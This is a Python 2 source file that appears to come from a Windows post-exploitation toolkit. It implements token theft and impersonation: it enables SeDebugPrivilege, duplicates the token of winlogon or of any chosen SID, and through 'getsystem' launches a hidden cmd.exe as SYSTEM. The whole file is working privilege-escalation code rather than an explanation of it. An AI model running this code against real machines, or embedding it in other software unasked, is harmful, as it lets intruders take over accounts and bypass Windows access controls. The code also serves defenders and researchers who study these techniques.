# -*- coding: utf-8 -*-
#Author: ??? and original code from https://github.com/joren485/PyWinPrivEsc/blob/master/RunAsSystem.py
#Contributor(s): @bobsecq

from ctypes.wintypes import *
from ctypes import *
import subprocess
import platform
import psutil
import sys
import os

ntdll    = WinDLL('ntdll',    use_last_error=True)
advapi32 = WinDLL('advapi32', use_last_error=True)
shell32  = WinDLL('shell32',  use_last_error=True)
kernel32 = WinDLL('kernel32', use_last_error=True)

LPVOID                          = c_void_p
PVOID                           = LPVOID
LPTSTR                          = LPSTR
LPCTSTR                         = LPSTR
PSID                            = PVOID
DWORD                           = c_uint32
LPSTR                           = c_char_p
LPWSTR                          = c_wchar_p
HANDLE                          = LPVOID
INVALID_HANDLE_VALUE            = c_void_p(-1).value
LONG                            = c_long
WORD                            = c_uint16

PROCESS_QUERY_INFORMATION       = 0x0400
READ_CONTROL                    = 0x00020000L
STANDARD_RIGHTS_READ            = READ_CONTROL
STANDARD_RIGHTS_REQUIRED        = 0x000F0000L
TOKEN_ASSIGN_PRIMARY            = 0x0001
TOKEN_DUPLICATE                 = 0x0002
TOKEN_IMPERSONATE               = 0x0004
TOKEN_QUERY                     = 0x0008
TOKEN_QUERY_SOURCE              = 0x0010
TOKEN_ADJUST_PRIVILEGES         = 0x0020
TOKEN_ADJUST_GROUPS             = 0x0040
TOKEN_ADJUST_DEFAULT            = 0x0080
TOKEN_ADJUST_SESSIONID          = 0x0100
TOKEN_READ                      = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
tokenprivs                      = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072L | 4))
TOKEN_ALL_ACCESS                = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                                    TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                                    TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                                    TOKEN_ADJUST_SESSIONID)

SE_PRIVILEGE_ENABLED_BY_DEFAULT = (0x00000001)
SE_PRIVILEGE_ENABLED            = (0x00000002)
SE_PRIVILEGE_REMOVED            = (0x00000004)
SE_PRIVILEGE_USED_FOR_ACCESS    = (0x80000000)

class TOKEN_INFORMATION_CLASS:
    #see http://msdn.microsoft.com/en-us/library/aa379626%28VS.85%29.aspx
    TokenUser       = 1
    TokenGroups     = 2
    TokenPrivileges = 3

class LUID(Structure):
    _fields_ = [
        ("LowPart",     DWORD),
        ("HighPart",    LONG),
    ]
    def __eq__(self, other):
        return (self.HighPart == other.HighPart and self.LowPart == other.LowPart)

    def __ne__(self, other):
        return not (self==other)

PLUID = POINTER(LUID)

class SID_AND_ATTRIBUTES(Structure):
    _fields_ = [
        ("Sid",         PSID),
        ("Attributes",  DWORD),
    ]

class TOKEN_USER(Structure):
    _fields_ = [
        ("User", SID_AND_ATTRIBUTES),]

LookupPrivilegeName             = advapi32.LookupPrivilegeNameW
LookupPrivilegeName.argtypes    = [LPWSTR, POINTER(LUID), LPWSTR, POINTER(DWORD)]
LookupPrivilegeName.restype     = BOOL

class LUID_AND_ATTRIBUTES(Structure):
    _fields_ = [
        ("Luid",        LUID),
        ("Attributes",  DWORD),
    ]
    def is_enabled(self):
        return bool(self.Attributes & SE_PRIVILEGE_ENABLED)

    def enable(self):
        self.Attributes |= SE_PRIVILEGE_ENABLED

    def get_name(self):
        size = DWORD(10240)
        buf = create_unicode_buffer(size.value)
        res = LookupPrivilegeName(None, self.Luid, buf, size)
        if res == 0: raise RuntimeError(GetLastError())
        return buf[:size.value]

    def __str__(self):
        res = self.get_name()
        if self.is_enabled(): res += ' (enabled)'
        return res

class TOKEN_PRIVILEGES(Structure):
    _fields_ = [
        ("PrivilegeCount",  DWORD),
        ("Privileges",      LUID_AND_ATTRIBUTES),
    ]
PTOKEN_PRIVILEGES = POINTER(TOKEN_PRIVILEGES)

class TOKEN_PRIVS(Structure):
    _fields_ = [
        ("PrivilegeCount",  DWORD),
        ("Privileges",      LUID_AND_ATTRIBUTES*0),
    ]
    def get_array(self):
        array_type = LUID_AND_ATTRIBUTES*self.PrivilegeCount
        privileges = cast(self.Privileges, POINTER(array_type)).contents
        return privileges

    def __iter__(self):
        return iter(self.get_array())

class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess',    HANDLE),
        ('hThread',     HANDLE),
        ('dwProcessId', DWORD),
        ('dwThreadId',  DWORD),
    ]

class STARTUPINFO(Structure):
    _fields_ = [
        ('cb',              DWORD),
        ('lpReserved',      LPSTR),
        ('lpDesktop',       LPSTR),
        ('lpTitle',         LPSTR),
        ('dwX',             DWORD),
        ('dwY',             DWORD),
        ('dwXSize',         DWORD),
        ('dwYSize',         DWORD),
        ('dwXCountChars',   DWORD),
        ('dwYCountChars',   DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags',         DWORD),
        ('wShowWindow',     WORD),
        ('cbReserved2',     WORD),
        ('lpReserved2',     LPVOID),    # LPBYTE
        ('hStdInput',       HANDLE),
        ('hStdOutput',      HANDLE),
        ('hStdError',       HANDLE),
    ]

class SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ("nLength",                     DWORD),
        ("lpSecurityDescriptor",        LPVOID),
        ("bInheritHandle",              BOOL),
    ]
PSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)

class OSVERSIONINFOEXW(Structure):
    _fields_ = [
        ('dwOSVersionInfoSize', DWORD),
        ('dwMajorVersion',      DWORD),
        ('dwMinorVersion',      DWORD),
        ('dwBuildNumber',       DWORD),
        ('dwPlatformId',        DWORD),
        ('szCSDVersion',        c_wchar * 128),
        ('wServicePackMajor',   DWORD),
        ('wServicePackMinor',   DWORD),
        ('wSuiteMask',          DWORD),
        ('wProductType',        BYTE),
        ('wReserved',           BYTE)
    ]
POSVERSIONINFOEXW = POINTER(OSVERSIONINFOEXW)

# advapi32

AdjustTokenPrivileges               = advapi32.AdjustTokenPrivileges
AdjustTokenPrivileges.restype       = BOOL
AdjustTokenPrivileges.argtypes      = [HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, POINTER(DWORD)]

CheckTokenMembership                = advapi32.CheckTokenMembership
CheckTokenMembership.restype        = BOOL
CheckTokenMembership.argtypes       = [HANDLE, PSID, POINTER(BOOL)]

ConvertSidToStringSidA              = advapi32.ConvertSidToStringSidA
ConvertSidToStringSidA.restype      = BOOL
ConvertSidToStringSidA.argtypes     = [DWORD, POINTER(LPTSTR)]

CreateProcessAsUser                 = advapi32.CreateProcessAsUserA
CreateProcessAsUser.restype         = BOOL
CreateProcessAsUser.argtypes        = [HANDLE, LPTSTR, LPTSTR, PSECURITY_ATTRIBUTES, PSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPTSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION)]

CreateWellKnownSid                  = advapi32.CreateWellKnownSid
CreateWellKnownSid.restype          = BOOL
CreateWellKnownSid.argtypes         = [DWORD, POINTER(PSID), LPVOID, POINTER(DWORD)]

DuplicateTokenEx                    = advapi32.DuplicateTokenEx
DuplicateTokenEx.restype            = BOOL
DuplicateTokenEx.argtypes           = [HANDLE, DWORD, PSECURITY_ATTRIBUTES, DWORD, DWORD, POINTER(HANDLE)]

GetTokenInformation                 = advapi32.GetTokenInformation
GetTokenInformation.restype         = BOOL
GetTokenInformation.argtypes        = [HANDLE, DWORD, LPVOID, DWORD, POINTER(DWORD)]

GetUserNameA                        = advapi32.GetUserNameA
GetUserNameA.restype                = BOOL
GetUserNameA.argtypes               = [LPTSTR, POINTER(DWORD)]

ImpersonateLoggedOnUser             = advapi32.ImpersonateLoggedOnUser
ImpersonateLoggedOnUser.restype     = BOOL
ImpersonateLoggedOnUser.argtypes    = [HANDLE]

LookupPrivilegeValueA               = advapi32.LookupPrivilegeValueA
LookupPrivilegeValueA.restype       = BOOL
LookupPrivilegeValueA.argtypes      = [LPCTSTR, LPCTSTR, PLUID]

OpenProcessToken                    = advapi32.OpenProcessToken
OpenProcessToken.restype            = BOOL
OpenProcessToken.argtypes           = [HANDLE, DWORD, POINTER(HANDLE)]

RevertToSelf                        = advapi32.RevertToSelf
RevertToSelf.restype                = BOOL
RevertToSelf.argtypes               = []

# kernel32

CloseHandle                         = kernel32.CloseHandle
CloseHandle.restype                 = BOOL
CloseHandle.argtypes                = [HANDLE]

GetCurrentProcess                   = kernel32.GetCurrentProcess
GetCurrentProcess.restype           = HANDLE
GetCurrentProcess.argtypes          = []

GetCurrentProcessId                 = kernel32.GetCurrentProcessId
GetCurrentProcessId.restype         = DWORD
GetCurrentProcessId.argtypes        = []

OpenProcess                         = kernel32.OpenProcess
OpenProcess.restype                 = HANDLE
OpenProcess.argtypes                = [DWORD, BOOL, DWORD]

LocalAlloc                          = kernel32.LocalAlloc
LocalAlloc.restype                  = HANDLE
LocalAlloc.argtypes                 = [PSID, DWORD]

LocalFree                           = kernel32.LocalFree
LocalFree.restype                   = HANDLE
LocalFree.argtypes                  = [HANDLE]

# ntdll
RtlGetVersion                       = ntdll.RtlGetVersion
RtlGetVersion.restype               = DWORD
RtlGetVersion.argtypes              = [POSVERSIONINFOEXW]

# shell32

IsUserAnAdmin                       = shell32.IsUserAnAdmin
IsUserAnAdmin.restype               = BOOL
IsUserAnAdmin.argtypes              = []

def GetUserName():
    nSize = DWORD(0)
    GetUserNameA(None, byref(nSize))
    error = GetLastError()

    ERROR_INSUFFICIENT_BUFFER = 122
    if error != ERROR_INSUFFICIENT_BUFFER:
        raise WinError(error)

    lpBuffer = create_string_buffer('', nSize.value + 1)

    success = GetUserNameA(lpBuffer, byref(nSize))
    if not success:
        raise WinError()
    return lpBuffer.value

def GetTokenSid(hToken):

    """Retrieve SID from Token"""

    dwSize = DWORD(0)
    pStringSid = LPSTR()
    TokenUser = 1

    r = GetTokenInformation(hToken, TokenUser, byref(TOKEN_USER()), 0, byref(dwSize))
    if r != 0:
        raise WinError()

    address = LocalAlloc(0x0040, dwSize)
    GetTokenInformation(hToken, TokenUser, address, dwSize, byref(dwSize))
    pToken_User = cast(address, POINTER(TOKEN_USER))
    ConvertSidToStringSidA(pToken_User.contents.User.Sid, byref(pStringSid))
    sid = pStringSid.value
    LocalFree(address)
    return sid

def EnablePrivilege(privilegeStr, hToken = None):

    """Enable Privilege on token, if no token is given the function gets the token of the current process."""

    if hToken == None:
        hToken = HANDLE(INVALID_HANDLE_VALUE)
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, GetCurrentProcessId())
        OpenProcessToken(hProcess, (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken))
        e = GetLastError()
        if e != 0:
            raise WinError(e)
        CloseHandle(hProcess)

    privilege_id = LUID()
    LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))
    e = GetLastError()
    if e != 0:
        raise WinError(e)

    SE_PRIVILEGE_ENABLED = 0x00000002
    laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
    tp  = TOKEN_PRIVILEGES(1, laa)

    AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)
    e = GetLastError()
    if e != 0:
        raise WinError(e)

def ListSids():
    sids=[]

    for proc in psutil.process_iter():
        try:
            pinfo = proc.as_dict(attrs=['pid', 'username', 'name'])
        except psutil.NoSuchProcess:
            pass
        if pinfo['pid']<=4:
            continue
        if pinfo['username'] is None:
            continue
        try:
            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pinfo['pid']))
            hToken = HANDLE(INVALID_HANDLE_VALUE)
            OpenProcessToken(hProcess, tokenprivs, byref(hToken))

            try:
                sids.append((pinfo['pid'], pinfo['name'], GetTokenSid(hToken), pinfo['username']))
            except:
                pass
            CloseHandle(hToken)
            CloseHandle(hProcess)
        except Exception as e:
            print e
    return list(sids)


def getProcessToken(pid):
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
    hToken = HANDLE(INVALID_HANDLE_VALUE)
    OpenProcessToken(hProcess, tokenprivs, byref(hToken))
    CloseHandle(hProcess)
    return hToken

def get_process_token():
    """
    Get the current process token
    """
    token = HANDLE()
    res = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token)
    if not res > 0:
        raise RuntimeError("Couldn't get process token")
    return token

def gethTokenFromPid(pid):
    try:
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pid))
        hToken = HANDLE(INVALID_HANDLE_VALUE)
        OpenProcessToken(hProcess, tokenprivs, byref(hToken))
        CloseHandle(hProcess)
        return hToken
    except Exception, e :
        print "[!] Error:" + str(e)
        return None

def getSidToken(token_sid):

    # trying to get system privileges
    if token_sid == "S-1-5-18":
        sids = ListSids()
        for sid in sids:
            if "winlogon" in sid[1].lower():
                hToken = gethTokenFromPid(sid[0])
                if hToken:
                    print "[+] using PID: " + str(sid[0])
                    return hToken
                else:
                    return None

    # trying to impersonate a token
    else:
        pids = [int(x) for x in psutil.pids() if int(x)>4]

        for pid in pids:
            hToken = gethTokenFromPid(pid)
            if hToken:
                if GetTokenSid( hToken ) == token_sid:
                    print "[+] using PID: " + str(pid)
                    return hToken

def impersonate_pid(pid, close=True):
    EnablePrivilege("SeDebugPrivilege")
    hToken = getProcessToken(pid)
    hTokendupe = impersonate_token(hToken)
    if close:
        CloseHandle(hTokendupe)
    return hTokendupe

def impersonate_sid(sid, close=True):
    EnablePrivilege("SeDebugPrivilege")
    hToken = getSidToken(sid)
    hTokendupe = impersonate_token(hToken)
    if close:
        CloseHandle(hTokendupe)
    return hTokendupe

global_ref=None
def impersonate_sid_long_handle(*args, **kwargs):
    global global_ref
    hTokendupe = impersonate_sid(*args, **kwargs)
    try:
        if global_ref is not None:
            CloseHandle(global_ref)
    except:
        pass
    global_ref = hTokendupe
    return addressof(hTokendupe)

def impersonate_pid_long_handle(*args, **kwargs):
    global global_ref
    hTokendupe = impersonate_pid(*args, **kwargs)
    try:
        if global_ref is not None:
            CloseHandle(global_ref)
    except:
        pass
    global_ref = hTokendupe
    return addressof(hTokendupe)

def impersonate_token(hToken):
    if not IsUserAnAdmin():
        raise OSError("You need admin rights to run impersonate !")
    EnablePrivilege("SeDebugPrivilege")
    #hToken = getProcessToken(pid)
    hTokendupe = HANDLE( INVALID_HANDLE_VALUE )
    SecurityImpersonation = 2
    TokenPrimary = 1
    if not DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, byref(hTokendupe)):
        raise WinError()
    CloseHandle(hToken)

    try:
        EnablePrivilege("SeAssignPrimaryTokenPrivilege", hToken = hTokendupe)
    except Exception as e:
        print e
    try:
        EnablePrivilege("SeIncreaseQuotaPrivilege", hToken = hTokendupe)
    except Exception as e:
        print e
    try:
        EnablePrivilege("SeImpersonatePrivilege")
    except Exception as e:
        print e

    if not ImpersonateLoggedOnUser(hTokendupe):
        raise WinError()

    return hTokendupe

def isSystem():
    sids = ListSids()
    for sid in sids:
        if sid[0] == os.getpid():
            if sid[2] == "S-1-5-18":
                return True
    return False

def create_proc_as_sid(sid, prog="cmd.exe"):

    # If a user try to impersonate a user token
    if sid != "S-1-5-18":
        if not isSystem():
            raise OSError("You need System privileges to impersonate a user token")
    else:
        # the user tries to getsystem
        if not IsUserAnAdmin():
            raise OSError("You need admin rights to run getsystem !")

    hTokendupe = impersonate_sid(sid, close=False)
    pid = start_proc_with_token([prog], hTokendupe)
    CloseHandle(hTokendupe)
    return pid

def getsystem(prog="cmd.exe"):
    return create_proc_as_sid("S-1-5-18", prog=prog)

def start_proc_with_token(args, hTokendupe, hidden=True):
    ##Start the process with the token.
    lpProcessInformation = PROCESS_INFORMATION()
    lpStartupInfo = STARTUPINFO()
    if hidden:
        lpStartupInfo.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
        lpStartupInfo.wShowWindow = subprocess.SW_HIDE

    CREATE_NEW_CONSOLE          = 0x00000010
    CREATE_UNICODE_ENVIRONMENT  = 0x00000400
    NORMAL_PRIORITY_CLASS       = 0x00000020

    dwCreationflag = NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE

    userenv = WinDLL('userenv', use_last_error=True)
    userenv.CreateEnvironmentBlock.argtypes = (POINTER(c_void_p), c_void_p, c_int)
    userenv.DestroyEnvironmentBlock.argtypes = (c_void_p,)
    cenv = c_void_p()

    success = userenv.CreateEnvironmentBlock(byref(cenv), hTokendupe, 0)
    if not success:
        raise WinError()

    success = CreateProcessAsUser(hTokendupe, None, ' '.join(args), None, None, True, dwCreationflag, cenv, None, byref(lpStartupInfo), byref(lpProcessInformation))
    if not success:
        raise WinError()

    print "[+] process created PID: " + str(lpProcessInformation.dwProcessId)
    return lpProcessInformation.dwProcessId

def rev2self():
    global global_ref
    RevertToSelf()
    try:
        if global_ref is not None:
            CloseHandle(global_ref)
    except Exception, e:
        print e
        pass
    global_ref=None
    print "\t[+] Running as: " + GetUserName()

def get_currents_privs():
    '''
    Get all privileges associated with the current process.
    '''
    return_length = DWORD()
    params = [
        get_process_token(),
        TOKEN_INFORMATION_CLASS.TokenPrivileges,
        None,
        0,
        return_length,
    ]
    res = GetTokenInformation(*params)
    buffer = create_string_buffer(return_length.value)
    params[2] = buffer
    params[3] = return_length.value
    res = GetTokenInformation(*params)
    assert res > 0, "Error in second GetTokenInformation (%d)" % res
    privileges = cast(buffer, POINTER(TOKEN_PRIVS)).contents
    return privileges

def can_get_admin_access():
    """
    Check if the user may be able to get administrator access.
    Returns True if the user is in the administrator's group.
    Otherwise returns False
    """
    SECURITY_MAX_SID_SIZE       = 68
    WinBuiltinAdministratorsSid = 26
    ERROR_NO_SUCH_LOGON_SESSION = 1312
    ERROR_PRIVILEGE_NOT_HELD    = 1314
    TokenLinkedToken            = 19

    # On XP or lower this is equivalent to has_root()
    # Note: sys.getwindowsversion() does work on every system
    if sys.getwindowsversion()[0] < 6:
        return bool(IsUserAnAdmin())

    # On Vista or higher, there's the whole UAC token-splitting thing.
    # Many thanks for Junfeng Zhang for the workflow: htttp://blogs.msdn.com/junfeng/archive/2007/01/26/how-to-tell-if-the-current-user-is-in-administrators-group-programmatically.aspx

    # Get the token for the current process.
    proc = GetCurrentProcess()
    try:
        token = HANDLE()
        OpenProcessToken(proc, TOKEN_QUERY, byref(token))
        try:
            # Get the administrators SID.
            sid = create_string_buffer(SECURITY_MAX_SID_SIZE)
            sz = DWORD(SECURITY_MAX_SID_SIZE)
            target_sid = WinBuiltinAdministratorsSid
            CreateWellKnownSid(target_sid, None, byref(sid), byref(sz))
            # Check whether the token has that SID directly.
            has_admin = BOOL()
            CheckTokenMembership(None, byref(sid), byref(has_admin))
            if has_admin.value:
                return True
            # Get the linked token.  Failure may mean no linked token.
            lToken = HANDLE()
            try:
                cls = TokenLinkedToken
                GetTokenInformation(token, cls, byref(lToken), sizeof(lToken), byref(sz))
            except WindowsError, e:
                if e.winerror == ERROR_NO_SUCH_LOGON_SESSION:
                    return False
                elif e.winerror == ERROR_PRIVILEGE_NOT_HELD:
                    return False
                else:
                    raise
            # Check if the linked token has the admin SID
            try:
                CheckTokenMembership(lToken, byref(sid), byref(has_admin))
                return bool(has_admin.value)
            finally:
                CloseHandle(lToken)
        finally:
            CloseHandle(token)
    except Exception,e:
        return None
    finally:
        try:
            CloseHandle(proc)
        except Exception,e:
            pass

# return string with major.minor version
def get_windows_version():
    os_version = OSVERSIONINFOEXW()
    os_version.dwOSVersionInfoSize = sizeof(os_version)
    retcode = RtlGetVersion(byref(os_version))
    if retcode != 0:
        return False

    return {
        'major_version' : os_version.dwMajorVersion.real,
        'minor_version' : os_version.dwMinorVersion.real,
        'build_number'  : os_version.dwBuildNumber.real
    }
